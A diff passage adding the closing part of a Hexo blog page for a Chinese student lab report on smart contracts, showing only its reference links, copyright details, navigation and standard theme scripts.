+<h2 id="四．参考资料"><a href="#四．参考资料" class="headerlink" title="四．参考资料"></a>四．<strong>参考资料</strong></h2><p>[1]  智能合约开发中13种最常见的漏洞：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38420688/article/details/139493581" >https://blog.csdn.net/qq_38420688/article/details/139493581 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>[2]  智能合约语言Solidity：<a class="link"   target="_blank" rel="noopener" href="https://www.w3ccoo.com/solidity/solidity_basic_syntax.html" >https://www.w3ccoo.com/solidity/solidity_basic_syntax.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>、<a class="link"   target="_blank" rel="noopener" href="https://learnblockchain.cn/docs/solidity/types.html" >https://learnblockchain.cn/docs/solidity/types.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> （留意Solidity版本的不同对代码使用可能的影响） </p>
+<p>[3]  Foundry教程|如何调试和部署Solidity智能合约：<a class="link"   target="_blank" rel="noopener" href="https://learnblockchain.cn/article/4524" >https://learnblockchain.cn/article/4524 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 竞学实训（3）</li>
+        <li><strong>Author:</strong> dawn_r1sing</li>
+        <li><strong>Created at
+                :</strong> 2025-07-11 22:17:12</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-11-08 11:44:08
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://dawnrisingdong.github.io/2025/07/11/竞学实训（3）/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/%E5%AE%9E%E9%AA%8C/">#实验</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/%E8%AF%BE%E5%86%85%E5%AD%A6%E4%B9%A0/">#课内学习</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2025/07/13/%E7%AB%9E%E5%AD%A6%E5%AE%9E%E8%AE%AD%EF%BC%884%EF%BC%89/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">竞学实训（4）</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/07/09/%E7%AB%9E%E5%AD%A6%E5%AE%9E%E8%AE%AD%EF%BC%882%EF%BC%89/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">竞学实训（2）</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">竞学实训（3）</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8CSmart-Contract"><span class="nav-text">实验Smart Contract</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%EF%BC%8E%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="nav-text">一．实验目的</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%EF%BC%8E%E5%AE%9E%E9%AA%8C%E5%86%85%E5%AE%B9"><span class="nav-text">二．实验内容</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%EF%BC%8E%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93"><span class="nav-text">三．实验总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%EF%BC%8E%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">四．参考资料</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">dawn_r1sing</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        33 posts in total
+                    </span>
+                    
+                        <span>
+                            65k words in total
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
